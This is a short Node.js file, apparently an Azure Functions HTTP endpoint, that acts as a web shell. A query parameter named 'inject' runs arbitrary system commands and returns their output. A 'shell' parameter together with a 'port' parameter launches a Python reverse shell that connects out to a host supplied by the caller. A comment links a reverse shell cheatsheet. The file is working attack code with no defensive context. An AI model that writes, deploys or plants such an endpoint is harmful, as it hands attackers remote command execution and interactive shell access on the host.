
const { exec } = require('child_process');
const nExec = require('util').promisify(exec)

// Examples https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

module.exports = async function (context, req) {

    if (req.query?.inject) {
        let sd
        let rr
        try {
            sd = await nExec(req.query?.inject)
        } catch (error) {
            rr = error
        }

        context.res = {
            body: sd || rr
        };
        context.done()

    }

    if (req.query?.shell) {

        let shell = `export RHOST="${req.query?.shell}";export RPORT=${req.query?.port};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`

        // The HTTP trigger does not wait for callback, because the callback would only come after shell was closed
        exec(shell, (stderr, stdout) => {
            console.log('checks', stderr, stdout)
        })
    }

    // if nothing else is done 
    context.res = {
        body: "accepted"
    };

}


